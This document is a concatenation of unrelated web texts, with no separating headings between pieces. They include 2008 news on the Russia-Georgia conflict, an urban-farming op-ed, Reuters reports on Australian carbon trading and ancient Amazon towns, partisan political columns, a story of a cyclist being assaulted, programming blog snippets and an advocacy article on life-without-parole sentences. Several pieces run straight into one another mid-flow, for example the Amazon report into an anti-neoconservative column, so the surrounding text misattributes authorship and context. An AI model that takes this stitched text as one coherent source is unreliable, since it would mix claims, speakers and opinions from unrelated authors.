A statement issued by his office said he welcomed the ceasefire agreement between Russia and Georgia " but notes that notwithstanding this agreement , violence continues , with civilians bearing the brunt . "
He urged all combatants " to respect and protect civilians in accordance with international humanitarian law and human rights law . "
In Washington , Gates launched a stinging attack on Russia for the scale of force used against Georgia , saying Russia 's actions were designed to " punish " Georgia for daring to integrate with western organisations , such as Nato , which are outside Russia 's influence .
" The Russians were prepared to take advantage of an opportunity and did so very aggressively in a way that went far beyond reasserting the autonomy of Abkhazia and South Ossetia , " he said .
He ruled out , however , the use of US military force in Georgia , saying there was " no prospect " of American troops being deployed in the region .
Military personnel will only be used in a humanitarian capacity to deliver aid to civilians , Gates said .
The comments from Gates and Rice came as tensions escalated between the US and Russia on the ground in Georgia .
The US has accused Russia of sabotaging airfields and other military infrastructure in Georgia , while Russia has expressed concern about the American airlift to the crisis - torn region .
An unnamed US official told the Associated Press there was a deliberate attempt by Moscow to cripple the already battered Georgian military .
Reports from the scene indicated Russian forces were trying to disable Georgia 's ability to fight again .
The allegations came as Russia 's general staff said it had concerns about the type of cargoes the US was airlifting to Georgia .
Colonel - General Anatoly Nogovitsyn , the Russian army 's deputy chief , told a news conference that Russian " peacekeepers " were in the Georgian port of Poti to conduct intelligence operations .
The general staff had previously denied its troops were in Poti , a Black Sea port with an oil terminal vital to the country 's fragile economy .
Nogovitsyn said : " We have information that American military transport aviation say they are delivering a certain humanitarian cargo to Tbilisi airport , though they said we had bombed the airport two days ago .
Let 's ask them will they invite you [ the media ] to check whether it is humanitarian or not ? "
What was really in the cargo , he asked .
" It is of major concern to Russians . "
He said over the previous 24 hours " we are just watching the situation .
There are still snipers out there , certain groups have gotten through , and the provocations are continuing .
" We will settle things with everyone , and right now establishing peace is the main issue . "
Reports today suggested Russian troops continued to move in and around Georgian towns despite a tense ceasefire .
Washington insisted it had had no problems with the Russians in getting humanitarian and medical aid into Georgia .
White House spokeswoman Dana Perino said : " We are not there to defend the ports , we are there to provide humanitarian aid . "
The Georgian government said today that Russia had expanded its military presence in Gori , contradicting earlier claims that it was pulling out of the key town where its presence has threatened the ceasefire .
At least five explosions were reportedly heard near Gori and other reports suggested a military supply depot near the town may have been blown up by Russians .
Elsewhere in Georgia , a camera crew from Associated Press Television News saw heavily armed Russian soldiers and military vehicles in the western town of Zugdidi , some of whom were wearing blue peacekeeping helmets but others wore green camouflage helmets .
In Moscow , the Russian foreign minister , Sergey Lavrov , reinforced the Kremlin 's determination not to guarantee Georgia 's borders .
" One can forget about any talk about Georgia 's territorial integrity because , I believe , it is impossible to persuade South Ossetia and Abkhazia to agree with the logic that they can be forced back into the Georgian state . "
His remarks came as the Russian president , Dmitry Medvedev , was meeting leaders of the two separatist regions .
As confusion mounted about how Russia was responding to US calls to pull out its troops to end the week - long conflict , a Russian general said they would soon start to return control of Gori to Georgia .
Gori lies south of the disputed South Ossetia region on the main east - west road through Georgia .
Russian and Georgian soldiers are reported to have briefly confronted each other at a checkpoint on Gori 's outskirts around midday local time , with Russian tanks hurrying to the scene to force the Russian troops to back off .
Some Georgian police are reported to have said that a Russian withdrawal broke down after their South Ossetian allies refused to leave .
Both sides have signed a ceasefire requiring forces to return to the positions they held before the conflict started last week .
But the truce allows Russian forces to take unspecified " security measures " .
The Kremlin could try to keep troops in Georgia while claiming to be protecting South Ossetia .
Russian troops moved into the region six days ago after Georgia began a military operation to retake it from separatist control .

This year , Carol Nissen 's crops include mesclun , cherry tomatoes , strawberries , and assorted herbs .
When she sits down to dine , she 's often eating food grown with her own two hands .
But Nissen is n't tilling the soil on a farm .
She 's a Web designer who lives in Jersey City , New Jersey — one of the most cramped , concrete - laden landscapes in the nation .
Nissen 's vegetables thrive in pots and boxes crammed into her house and in wee plots in her yard .
" I'm a micro - gardener , " she says .
" It 's a pretty small townhouse .
But it 's amazing what you can do without much space . "
The term for this is urban farming — the art of growing vegetables in cities that otherwise resemble the Baltimore of * The Wire .
*
It has become increasingly trendy in recent years , led by health - conscious foodies coveting just - picked produce , as well as hipsters who dig the roll - your - own vibe .
But I think it 's time to kick it up a notch .
Our world faces many food - resource problems , and a massive increase in edible gardening could help solve them .
The next president should throw down the gauntlet and demand Americans sow victory gardens once again .
Remember the victory garden ?
During World Wars
I and II , the government urged city dwellers and suburbanites to plant food in their yards .
It worked :
The effort grew roughly 40 percent of the fresh veggies consumed in the US in 1942 and 1943 .
These days , we 're fighting different battles .
Developing nations are facing wrenching shortages of staples like rice .
Here at home , we 're struggling with a wave of obesity , fueled by too much crappy fast food and too little fresh produce , particularly in poorer areas .
Our globalized food stream poses environmental hazards , too :
The blueberries I had for lunch came from halfway around the world , in the process burning tons of CO 2 .
Urban farming tackles all three issues .
It could relieve strain on the worldwide food supply , potentially driving down prices .
The influx of fresh vegetables would help combat obesity .
And when you " shop " for dinner ingredients in and around your home , the carbon footprint nearly disappears .
Screw the 100 - mile diet — consuming only what 's grown within your immediate foodshed — this is the 100 - yard diet .
Want to cool cities cheaply ?
Plant crops on rooftops .
This is n't just liberal hippie fantasy , either .
Defense hawks ought to love urban farming , because it would enormously increase our food independence — and achieve it without the market distortions of the benighted farm bill .
You do n't need tomatoes from Mexico if you can pluck them from containers on your office roof .
Better yet , urban farming is an excuse to geek out with some awesome tech .
Innovations from NASA and garage tinkerers have made food - growing radically more efficient and compact than the victory gardens of yore .
" Aeroponics " planters grow vegetables using mist , slashing water requirements ; hackers are building home - suitable " aquaponics " rigs that use fish to create a cradle - to - grave ecosystem , generating its own fertilizer ( and delicious tilapia , too ) .
Experts have found that cultivating a mere half - acre of urban land with such techniques can yield more than $ 50,000 worth of crops annually .
But what I love most here is the potential for cultural transformation .
Growing our own food again would reconnect us to this country 's languishing frontier spirit .
Once you realize how easy it is to make the concrete jungle bloom , it changes the way you see the world .
Urban environments suddenly appear weirdly dead and wasteful .
When I walk around New York City now , I see the usual empty lots and balconies and I think , Wait a minute .
Why are n't we growing food here ?
And here ?
And here ?
In fact , that 's precisely what occurred to me when I came home and looked at the window of my apartment .
So now it holds three pots balanced on the ledge :
One with herbs , one with lettuce , one with tomatoes .
I should have my first crop in about a month .
And I expect my victory salad to taste very sweet indeed .

It was only when I lay there on the rotting prison straw that I sensed within myself the first stirrings of good .
Gradually it was disclosed to me that the line separating good and evil passes not between states nor between social classes nor between political parties , but right through every human heart , through all human hearts .
And that is why I turn back to the years of my imprisonment and say , sometimes to the astonishment of those about me , bless you , prison , for having been a part of my life .

SYDNEY ( Reuters ) - Australia has recorded its largest transaction in carbon emissions , with 20,000 tonnes of carbon sold forward at A$ 21.50 ( $ 19.51 ) a tonne , a carbon broker said on Friday , as the nation prepares to curb greenhouse gases .
Australia , the rich world ’s largest per-capita emitter of greenhouse gases , plans to cap emissions from 2010 and introduce a carbon - trading system where businesses that pollute less can sell emission credits to those firms that pollute more .
“ I believe it to be the biggest deal that ’s been done , ” said Gary Cox , head of environmental derivatives for Newedge Group in Australia .
He declined to give details on the buyer or seller .
An over - the - counter market in carbon emissions has emerged this year as businesses such as coal - fired power generators look to hedge uncertainty surrounding the eventual price of carbon when Australia ’s proposed cap - and - trade system kicks off .
Speculators are also looking to make money by providing badly needed liquidity to the emerging market in carbon dioxide .
The latest deal is for delivery in February 2012 and was finalized last week , Cox said .
Though it was the largest deal to date , he added , at 20,000 tonnes it was still tiny compared with the few millions of tonnes of carbon emitted each week by Australia ’s power industry alone .
“ It ’s a drop in the ocean , ” Cox said , adding that buyers and sellers were still feeling their way , starting with small deals and gradually expanding them as confidence and liquidity grew .
Carbon is trading in Australia at around half the level of prices in the more mature markets of Europe where carbon credits -- permits to pollute -- for December 2008 delivery have been trading at around 26 euros ( $ 39.83 ) a tonne .
Australia ’s Westpac bank and utility AGL Energy are credited with Australia ’s first carbon deal in May this year .

WASHINGTON ( Reuters ) - A vast region of the Amazon forest in Brazil was home to a complex of ancient towns in which about 50,000 people lived , according to scientists assisted by satellite images of the region .
The scientists , whose findings were published on Thursday in the journal Science , described clusters of towns and smaller villages connected by complex road networks and housing a society doomed by the arrival of Europeans five centuries ago .
European colonists and the diseases they brought with them probably killed most of the inhabitants , the researchers said .
The settlements , consisting of networks of walled towns and smaller villages organized around a central plaza , are now almost entirely overgrown by the forest .
“ These are not cities , but this is urbanism , built around towns , ” University of Florida anthropologist Mike Heckenberger said in a statement .
“ If we look at your average medieval town or your average Greek polis , most are about the scale of those we find in this part of the Amazon .
Only the ones we find are much more complicated in terms of their planning , ” Heckenberger added .
Helped by satellite imagery , the researchers spent more than a decade uncovering and mapping the lost communities .
Prior to the arrival of Europeans starting in 1492 , the Americas were home to many prosperous and impressive societies and large cities .
These findings add to the understanding of the various pre-Columbian civilizations .
The existence of the ancient settlements in the Upper Xingu region of the Amazon in north - central Brazil means what many experts had considered virgin tropical forests were in fact heavily affected by past human activity , the scientists said .
The U.S. and Brazilian scientists worked with a member of the Kuikuro , an indigenous Amazonian people descended from settlements ’ original inhabitants .
The basic flaw in the neoconservative ideology is that democracy cannot be imposed on other people at the point of a gun .
Furthermore , if neoconservatives came from an American tradition rather than a Trotskyite tradition , they would understand that America itself is not a democracy .
Benjamin Franklin emerged from the Constitutional Convention and a lady asked him , " Well , Mr. Franklin , what kind of government have you given us ? "
He did not say democracy .
He replied , " Madam , we have given you a republic — if you can keep it . "
A republic and a democracy are two different animals .
A democracy , which can actually work only in a very small country , allows citizens to vote on every issue .
A republic allows citizens to elect representatives , who then use their own judgment to decide issues .
If the citizens disagree with the representatives ’ decisions , they can replace them at the next election .
Furthermore , mere elections are not what define America ’s unique form of freedom .
Today , practically every country in the world has elections , most of dubious validity .
What most countries lack is a commitment on the part of their individual citizens to the concept of human rights , which cannot be legitimately abrogated by government .

For us , that concept took centuries of thought and conflicts to mature .
It began at Runnymede when some barons presented a British king with demands that became known as the Magna Carta .
It placed limits on the king ’s powers and defined certain rights not only for the aristocracy but for the common folk , too .
And the barons were there with their swords to make sure the king understood that it was not negotiable .
A great deal of blood was shed and words written and spoken before the concept matured .
Today it ’s found mainly in what in politically incorrect days were called the Anglo - Saxon countries — the United Kingdom , Canada , the United States , Australia and New Zealand .
Our form of freedom is a gift from our English - speaking ancestors .
In other parts of the world , government went off in different directions , even those we consider more or less free .
But their concept of freedom is not the same as ours .
The Debate on the Cons ... Various Best Price : $ 5.34 Buy New $ 24.94 ( as of 11:40 EST - Details )
Ours is best summed up in the Declaration of Independence .
All men are given unalienable rights by God .
The sole purpose of government is to protect those rights .
When a government instead abuses those rights , then the people have the right and the duty to overthrow it and create a new government .
Some Americans today are so stupid and / or ignorant of their country ’s history that if you asked them if people have the right to overthrow a government , they would reply in the negative .
I had a professor who asked that question , and in a class of more than 30 students , only four of us said " Yes . "
For God ’s sake , if you ’re going to claim to be an American , at least read the Declaration of Independence , the Constitution and the Federalist Papers .
A good history of England and America certainly would n’t hurt .
Our concepts of a free society are as foreign to the Arabs ( and the rest of the non-Anglo - Saxon world ) as Arabic and Chinese are to us .
If Allah wills , they might evolve their own version of a more or less free society , but it will not be like ours .
And they darn sure are not going to accept anything imposed on them at the point of a gun by " infidels . "
George W. Bush is dead - wrong to believe he ’s been anointed by God to spread democracy .
He was merely barely elected to serve the people of the United States in accordance with our Constitution .
Even that appears to be more than he can handle .
But if he tries to lead a crusade against the Muslim world , he will meet the same fate as the earlier Crusaders — defeat and disgrace .

IT seemed like a good idea at the time .
Save gas money , be environmentally correct , lose weight  just by biking to work .
And so after two decades , Dan Cooley , 41 , saddled up a silver 21 - speed Raleigh in April to make the daily two - mile commute to his nursing job at a senior citizen center in Louisville , Ky .
In four months , he lost 15 pounds .
Way to go , Dan !
Friday morning , July 25 , around 6:50 a.m. , he was pedaling on a residential street , wearing his green hospital scrubs , when a Volkswagen roared out of a driveway in front of him .
Swerving to avoid the car , Mr. Cooley cursed loudly and rode on .
The driver and his passenger cursed back .
As Mr. Cooley pulled over to the sidewalk , the car turned onto a driveway , knocking him off his bike .
In Mr. Cooley ’s narrative , the passenger , swearing , jumped out and pummeled him .
Then he got back into the car , which zoomed away .
Mr. Cooley lay prostrate on the sidewalk , bloodied , with a concussion and a torn ligament .
“ We ’ve had a car culture for so long and suddenly the roads become saturated with bicyclists trying to save gas , ” Mr. Cooley said 10 days after the attack , still feeling scrambled , in pain and traumatized .
“ No one knows how to share the road . ”
He does n’t plan to bike to work again this season .
Well , this is embarrassing .
Well , it turns out it ’s been over 4 years since I last wrote a blog post .
Whoops .
Pretty much the entire time I ’ve been occasionally telling myself “ Oh yeah , I should start writing blog posts again . ”
Well , here we go .
Yet another “ I ’m still alive ” post .
If you ’re wondering what I ’ve been doing , I recommend taking a look at the title of the site .
After realizing I did n’t have enough savings to try to launch a product I took another job which ended up taking up all of my time and nearly killing myself with stress .

A short while after writing this post I ended up taking a job which involved working on a text editor and so continuing work on sated would have been a conflict of interests ( and potentially caused my work on sated to be the property of my employer at the time ) .

⚃ Rolling Dice with JS and Unicode ⚂ I recently discovered the unicode xscreensaver hack , and have had it running on my secondary monitor for the heck of it .
I found out that there are dice face symbols , and I was inspired to do something with them .
So , I made a simple Unicode - dice roller in JavaScript .
I know the same thing could be done in JS , but this way you can roll some numbers to paste into Twitter or something , if you feel like it .

A save your place bookmarklet ( image source ) I read a lot of web comics , and one of the things that happens when reading through the archives of a comic is that I lose my place in the history , so when I come back , I have to spend a lot of time searching to find where I left off .
I wrote this simple set of bookmarklets to help me in this situation .
The “ save place ” bookmarklet stuffs the current URL into a cookie ( cookies are per site , so there will be one cookie for each site you use this on ) , and the “ restore place ” bookmarklet takes the URL out of the cookie ( if it exists ) and loads that page .

A Simple Lisp Parser in Python
A managed to sneak in a little time recently and write a simple Lisp s-expression parser in Python .
I started out with a version that just understands parentheses , atoms , and strings , but it was just a couple of extra lines to add in support for the quote “ operator ” , that I went ahead and threw that in there , too .
I ’ll go ahead and go through it bit - by - bit here , though I think it ’s pretty straightforward .

IE7 Requires type =" submit " for < button > elements
If you do n’t specify type =“ submit ” for a < button > element , IE7 ( and probably IE6 , too ) will do nothing when that button is clicked ( well , unless you have an onclick handler on that element , of course ) .
The W3C HTML standard states that the default for a < button > element should be “ submit ” , but if you want it to work with IE7 or earlier , you ’ll have to be explicit about it .
I lost some precious time on this fun bug .

A brainfuck synthesizer
For my latest in my series of 500 Programming Languages , I decided to write a ( simple ) synthesizer in brainfuck .
Introduction to brainfuck brainfuck is an esoteric programming language based on the idea of making a language with the smallest possible compiler .
Indeed , my Python brainfuck compiler is only 30 lines of Python code , and I ’m sure there are some optimizations I could have done to make it shorter if that was my goal with the whole thing .

Marlene Martin , national director of the Campaign to End the Death Penalty , examines a punishment that many people consider a " slow form of death " -- life without the possibility of parole sentences .
Mark Clements , an Illinois prisoner serving life without parole , gathered interviews for this article .
" I 've been locked up in Illinois prisons since I was 16 .
I was tortured into confessing to a crime I did n't commit .
I 've been here for over 25 years .
To look out and think this is where I will stay for the rest of my life -- now that is a living , unbearable hell . "
-- Mark Clements , Chicago police torture victim , serving a juvenile life without parole sentence in Illinois
MARK CLEMENTS was arrested when he was 16 years old and sentenced to life in prison without the possibility of parole .
Like most juveniles sentenced to life without parole , he was tried as an adult and sent to an adult prison to serve his sentence .
Today , Mark is 43 years old .
He has spent almost twice as much of his life locked up in prison as he lived free .
America outstrips every other nation in the world in the number of people it puts in its prisons .
The U.S. has 5 percent of the world 's population , but accounts for 25 percent of prisoners .
According to a study by the Pew Center on the States , one out of every 100 adults in the U.S. is in prison or jail .
And because of the racism of the American " justice " system , the numbers are much higher for people of color -- if you are an African American man between the ages of 20 and 34 , your likelihood of being behind bars today is one in nine .
But the U.S. stands even further apart from the rest of the world in one nightmarish aspect of its prison system -- the men and women sentenced to spend the rest of their lives behind bars .
There are over 132,000 people serving life sentences in the U.S.
One in 10 are forbidden from ever receiving parolee , but overall , only one in four of the larger group will ever come before a parole board .
Despite FBI crime statistics showing a drop in violent crime over the past decade , the number of people sentenced to life in prison has nearly doubled .
Paul Wright , the editor of Prison Legal News and author of two books on the prison system -- who himself served 17 years of a life sentence -- said life without parole sentences are " a death sentence by incarceration .
You 're trading a slow form of death for a faster one . "
This kind of sentencing is virtually unheard of elsewhere in the world .
" Western Europeans regard 10 to 12 years as extremely long term , even for offenders sentenced to life , " says James Whitman , author of the book Harsh Justice .
And among the prisoners with life sentences in the U.S. are 2,380 people who were sentenced to life without parole as " juvenile offenders " -- in other words , they were under the age of 18 when the crimes they were accused of were committed -- according to Human Rights Watch .
Of these juvenile offenders , 73 were sentenced to life in prison without parole at the age of 13 or 14 years old , according to research done by the Equal Justice Initiative .
To put this in perspective , no other country in the world sentences 13 year olds to life without parole .
In fact , outside of the U.S. , only 12 juvenile offenders anywhere in the world are serving this sentence , according to Human Rights Watch .
Seven are in Israel , four are in South Africa , and one is in Tanzania .
There are over 2,000 in the United States .
" I'm the first to say that I made my share of mistakes in life -- I 'm not perfect .
But life without the possibility of parole is a life - draining sentence .
No matter how hard I try to better myself , I 'm treated as if I am the worst of the worst .
I can't sleep nights .
I can't rest in my body because this one bad choice to hang with friends could cost me my freedom forever . "
-- Daniel Henney , serving a juvenile life without parole sentence in Illinois
ONE THING that stands out about prisoners sentenced to life without the possibility of parole is that they do n't stand out as the inhuman monsters they are often depicted to be .
Among all prisoners with life sentences , from 1988 to 2001 , 40 percent were convicted of a crime other than murder .
Of juvenile offenders given life without parole sentences , 59 percent -- well over half -- had never been convicted of a previous crime , according to Human Rights Watch .
Antonio Nunez was raised in Los Angles , his life shaped by gang violence .
As the Equal Justice Initiative described in its report " Cruel and Unusual , " at the age of 14 , he got into a car with two older men , one of whom had been kidnapped .
A police chase ensued , and gunfire was exchanged .
No one was killed ; no one was even hurt .
But Antonio was sentenced to life in California 's San Quentin prison , where he remains today .
" He has lost all hope , " his sister Cindy Nunez told Reuters .
" We try to keep his spirits up by saying something will change in the law . "
Rather than their alleged crimes , other factors stand out about those serving life without parole sentences .
Invariably , they are poor .
Many came from violent homes or suffered abuse .
And an overwhelming proportion are minorities .
According to Human Rights
Watch , among juvenile offenders serving life without parole for crimes other than murder , every single one is a person of color .
In Illinois , Mark Clements is one of 103 juvenile offenders serving a life without parole sentence .
Of these 103 , 74 are , like Mark , African American ; 10 are Latino and 19 are white .
Ian Manuel is one .
Raised in a climate of violence and poverty , he was drawn to gang activity at a young age .
At 13 , he committed a robbery and shot a woman , who survived .
Feeling remorseful , Ian turned himself into the police and pled guilty .
He was sentenced to life without the possibility of parole .
Ian has spent years in solitary confinement and attempted suicide several times .
He remains in prison in Florida despite the fact that the victim has forgiven him and petitioned the court for his release .
One reason these injustices can take place is that judges are barred , under mandatory sentencing laws , to take any account of age or background information .
In Illinois , for example , where judges are required to impose life without parole sentences on defendants convicted of certain crimes , without consideration of any mitigating circumstances , several have gone on record with their misgivings .
In passing sentence in one case , Judge James Linn stated that he believed the defendant " should suffer harsh criminal consequences for acting as a lookout in this case , but to suggest that he ought to receive a sentence of life without the possibility of parole , I find to be very , very hard to swallow , to the point where I can describe it as unconscionable . "
Probably the most notorious mandatory sentencing policy in the country is California 's " three strikes and you 're out " law , passed in a referendum of California voters in 1994 .
A third felony conviction automatically lands defendants in prison for 25 years to life .
Since it was implemented , over 1,000 people have gone to prison under three strikes in California for non-serious crimes .
Take Santos Reyes .
His " crime " was to help his cousin , a Mexican immigrant who was unable to take a drivers ' test because he could n't write English , but needed a license so he could begin working as a roofer with Reyes .
For this , Santos was convicted of felony perjury .
Reyes had been convicted of two previous felonies more than a decade before -- stealing a radio when he was 17 and a robbery when he was 22 .
In neither case was anyone harmed .
In the years between , he had gotten married , had two children and worked steadily as a roofer .
But because the perjury charge was a third felony , he was sentenced to prison under three strikes -- where he has spent the last nine years , all for taking a drivers ' test for his cousin .
" He was convicted for the crimes of being poor and Mexican , " said Rachael Odes , who helps coordinate the Free Santos Reyes committee .
" He 's just one of many .
There are so many people serving long sentences for nonviolent crimes .
He 's a regular guy who was trying to make a living . "
" I have little hope at all .
This sentence is like a death sentence .
It is torture on my sanity .
There 's no second chances for any of us .
No matter how good or bad I am , these cruel prison conditions are all I have to look forward to . "
-- Paul Lee , serving a juvenile life without parole sentence in Illinois
THE STANDARD argument in favor of harsh sentencing is that it keeps the public safe .
But does it ?
" Studies have shown that offenders who have served over 20 years in prison rarely ever reoffend and never for a violent crime , " says Linda Goodman from Citizens for Earned Release .
" The recidivism rate for older inmates is less than 2 percent . "
And the rest of the industrialized world , where such harsh sentences are unheard of , has a far lower violent crime rate .
The U.S. has n't always had lock - them - up - and - throw - away - the - key sentencing policies .
Before the 1970s , life without the possibility of parole sentences were unknown .
During the 1960s , in fact , the emphasis in prison policy was on rehabilitation and helping prisoners get training and education so they could successfully rejoin society upon their release .
Congress amended federal parole statues to make it possible for prisoners serving life sentence to be eligible for parole after 15 years .
But in the 1970s , this began to change .
Politicians saw that " tough on crime " rhetoric could both win them votes and drive back the gains made by the civil rights and other social movements of the 1960s and early ' 70s .
The emphasis of new laws turned to punishing prisoners , rather than rehabilitation .
In 1984 , the Sentencing Reform Act eliminated parole for all federal crimes .
By 2000 , 33 states had abolished parole , up from 17 over previous decades -- and 24 states had introduced three - strikes sentencing laws .
And more and more states established life without the possibility of parole sentences .
Currently , only New Mexico and Alaska do n't have a life without parole sentence on the books .
U.S. policymakers seem determined to march out of step with the rest of the world on the use of harsh prison sentences .
In 2006 , the United Nations General Assembly passed a resolution calling on all nations to abolish life without the possibility of parole sentences for youth offenders .
The margin was 185 to 1 - - with the U.S. casting the one and only vote against .
Efforts to win change in sentencing laws have had mixed results .
In 2004 , California activists organized a campaign for a referendum to amend the three - strikes law to trigger the sentence only if the third felony was a " serious " one .
Leading up to the vote , opinion polls showed two - thirds support for the referendum .
But a last - minute advertising blitz and campaign by conservatives like Gov. Arnold Schwarzenegger turned the tide , and the referendum lost by a narrow margin .
This year , supporters were unable to gather enough signatures to put the measure on the ballot again in California .
But a bill to abolish life without parole sentences for youth offenders passed the Senate Public Safety Committee in April and is being considered by the full state Senate .
If this legislation passes , California would join nine other states that prohibit life without parole sentences for juveniles .
In Illinois , efforts by some grassroots groups to allow juveniles with life without parole sentences to come before a parole board after serving 10 years is underway , but the attempt is being stymied by opposition from victims ' rights groups .
It 's long past time that life without paroles sentences were eliminated - - for juveniles or adults .

SWAMPOODLE REPORT : HOW TO BEAT THE REPUBLICANS
Sam Smith
Stop talking like them .
As Harry Truman said , " Give the people a choice between a Republican and a Democrat who talks like a Republican and they 'll choose the Republican every time . "
Ever since closet conservative Bill Clinton conned his party into thinking that his narrow 1992 win thanks to Ross Perot 19 % of the vote was some sort of triumph , the Democrats have been under the illusion that the way to win is to play Republican .
It has n't worked .
Since then the number of Democratic governors , senators , representatives and state legislators have declined markedly .
The biggest Democratic margins - under FDR and LBJ - have occurred when there was not the slightest doubt what Democrats were and what they were going to do for you .
Answer the important question :
There were only two really important questions in politics : what have you done for me lately and what are you going to do for me ?
There is no major candidate running who can give a good answer to the first question but there is no reason why Obama can't give a better answer to the second than he has so far .
The answer needs to be not grandiose and abstract - like $ 150 billion for alternative energy over the next decade - but specific and personally appealing and without a lot of ideological baggage :
Here are a few examples :
- Add to the Obama healthcare plan that nobody can really understand this simple proposal : lower the age of Medicare from 65 to 60 .
There are ten million people who will like this .
If you want to try for more , add Medicare for children from birth to five and when the Republicans oppose it , just say that Democrats , unlike the GOP , do n't believe that the sanctity of life ends when a baby leaves the birth canal .
Where 's the money going to come from ?
Well , we 're getting out of Iraq are n't we ?
- Come up with a major plan to revive passenger trains in America with particular emphasis on places that are currently short changed ( like a lot of red states ) .
Biden , the DC - Delaware Amtrak commuter , is the perfect guy to push this .
Most people do n't know much about solar collectors or wind farms , but they do know about trains and could easily appreciate how they could make moving things and people cheaper .
- Attack credit card usury .
Sure , Biden is the Man from Mastercard but if he 's vice president he wo n't need them so much .
No issue would be more easily supported by more people than a proposal to return credit card interest rates to their 1980s single digit levels .
- Help homeowners rather than just lenders .
Stunningly ignored in all the talk about the Fannie and Freddy bailout is that it grossly favors lenders over borrowers .
If we can have socialism for the biggest and the richest , let 's have it for the little ones as well .
One plan : shared equity in which the feds help qualified first time homeowners and those facing foreclosure by taking over some of their house equity .
You can reasonably bet that a decade from now the government would do better financially with such a plan than with lemon socialism for the big guys .
- Reduce National Guard exposure to overseas adventures .
The abuse of the country 's state militias in recent decades has been astounding .
In Vietnam , for example , only 23,000 were called up but by the first American Iraq invasion , the number soared to 75,000 .
More than 270,000 National Guard troops taken part in George Bush 's escapades in Iraq and Afghanistan , more elsewhere .
one .
Many have had their service extended beyond the original twelve months and many are subjected to double tours .
Among other things , the foreign abuse of the National Guard reduces reenlistment and while the numbers directly affected is not that large , when you add in families , friends , fellow parishioners and co-workers who learn of the disruption being caused by the use of National Guard by politicians as political toy soldiers , it becomes a significant issue .
Speak United States - Obama needs to get out of the pulpit and give voters more than a crowd handshake .
Speaking to 75,000 of the fully converted does n't amount to much when you compare it with the number of undecided voters .
Obama efforts often come off as haughty and above it all .
He needs to stop talking so much and start listening more , to stop preaching and start chatting .
He needs to toss around more basketballs and fewer bromides .
Get real .
Perhaps by now Obama has learned that those of who live by spin can also die by it .
His relatively benign con of the conventional parading as special and superior worked fine for the primaries but almost instantly deflated .
One reason was even noted by Obama : the GOP is far better at campaigning than at governing .
One reason for this : they are much more willing to lie .
Watching the GOP convention was like being at a talent show of a mental institution .
The theatrics were great but much was based on psychopathic , hypocritical and dishonest rhetoric .
If you are going to try to outspin them without being a crook you 're probably going to lose .
The alternative is to keep steering the public back to reality such as constantly asking the question Ronald Reagan raised : are you better off than you were eight years ago ?
And Obama needs to dump the hope thing unless he starts giving specific reasons for the hope .
Forget law school - From the start , the image some of us got of Obama was not primarily that of a black man but of a law school graduate .
One of the major problems with this is that lawyers can drain the life out of any topic and Obama has well developed this questionable skill .
He tries to come across as thoughtful and balanced ; instead too often his lawyerly equivocation raises concerns rather than answering them .
This is not his problem alone .
It is part of the culture of Washington which has been overwhelmed by the culture of lawyers , so much so it is highly like that Social Security , a minimum wage or Medicare could never be passed today .
Washington 's political lawyers would find too much wrong with them .
Give David Axelrod some help - As Mark Cunningham noted in the NY Post , neither Obama nor his campaign guru have much experience dealing with real GOP opposition : " Barack Obama has never run a campaign against a real Republican .
And his main strategist , David Axelrod , is way out of his areas of expertise .
Axelrod specializes in urban politics .
He 's run a bunch of mayoral races ( usually in cities with lots of blacks ) , plus contests in true - blue states like Massachusetts and New York . . .
Obama has lived a lot of places , but his adult life has been overwhelming anti-Palin country - urban and / or elite : here in New York as a Columbia undergrad , and later with NYPIRG ; Cambridge , Mass. , for Harvard ; Chicago . "
Obama desperately needs some James Carville types to help him learn how to deal politicallyt and rhetorically with much of America .
Do n't blame voters for the ethnic divide ; cross it - Sure there 's a lot of racism in America but most of it was already locked up for McCain long ago .
And liberals do themselves no service by confusing the normal hesitancy of ethnic unfamiliarity with racism , implicitly blaming the very voters they 're trying to reach .
Black politicians have a particularly hard time because they have so long operated in the comfort of places with large black constituencies .
It is amazing how few models of cross-ethnic black pols ( Doug Wilder is a rare exception ) that Obama has .
It is , however , a skill that Obama has to learn fast .
Among the best models are the old Irish politicians who instinctively understood that the only way a minority could truly win was by leading the majority and to do that you had to turn one 's own ethnicity into something everyone could share and enjoy .
This is why since Martin Luther King Jr , the African - American figures who have been among the best at reaching into white culture have been black comedians .
Similarly , political scientist Milton L. Rakove , credits Irish dominance in Chicago partially to the fact that the Irish ran saloons that " became centers of social and political activity not only for the Irish but also for the Polish , Lithuanian , Bohemian and Italian immigrants .
. .
As a consequence of their control of these recreational centers of the neighborhoods , the Irish saloon keepers and bartenders became the political counselors of their customers , and the political bosses of the wards and , eventually , of the city . "
As one politician put it , " A Lithuanian wo n't vote for a Pole , and a Pole wo n't vote for a Lithuanian .
A German wo n't vote for either of them -- but all three will vote for an Irishman . "
Obama needs to act more like an old Irish pol or a black comedian .
Do n't raise McCain and Palin 's status ; lower it - Abused Democratic candidates have a tendency to unintentionally increase their opponents status by the ponderousity of their outrage .
The alternative is to steadily , gently and with humor lower that status by helping voters to not take them so seriously .
One of the best examples of this was Earl Long when he ran against Fred Preaus , a church deacon , head of the chamber of commerce and a scrupulously honest car dealer .
Earl would combat these virtues by saying : " Fred Preaus is an honest man .
If I were buying a Ford car , I 'd buy it from Fred Preaus .
He would give me a good deal .
If I had trouble with the car , he'd give me a loaner while he got it fixed -- that 's just the kind of man he is .
But if I was buying two Fords -- well , he 's just not big enough to handle a deal that size . "
Obama needs to make people understand what size deal McCain and Palin could truly handle which , at best , is somewhere between one and two Fords .

BEHIND THE FALLEN WALLS
Progressive Review -
We find it interesting that the media is ignoring the fact that the Treasury Secretary controlling the bailout of the American financial interest was formerly the head of one of the major money machines : Goldman Sachs , as was his predecessor , Robert Rubin .
In other contexts , this would be considered a major conflict especially since Goldman Sachs has a huge interest in the bailout of Fannie and Freddie and far less interest in the success of Lehman Brothers , which Henry Paulson let fail .
It 's a little like the situation with the sainted Alan Greenspan of whom the French economist Patrick Artus said , " He created four major crises : savings and loans , [ Long - Term Capital Management ] , new - technology shares , and subprime mortgages . "
He then was " congratulated for his role as fireman , but he 's the one who started the fire . "
Having covered the Savings & Loan scandal - in which the bailout became the successor scandal - we can assure you that the powers that be have absolutely no interest in finding out how we got into this mess , only in how their friends can survive as well as possible .
But as a reminder of how this stuff really works , consider this Wikipedia note on Robert Rubin :
" In 1999 , affirming his career - long interest in markets , Mr. Rubin joined Citigroup .
Of note , the supermerger between Travelers Group and Citicorp was facilitated by the repeal of the Glass Steagall Act .
This legislation was passed under the Clinton administration , days before Rubin 's resignation .
Consolidation of investment , commercial banking , and insurance services as practiced by Citigroup under the direction of Rubin , has been implicated in the subprime mortage crisis .
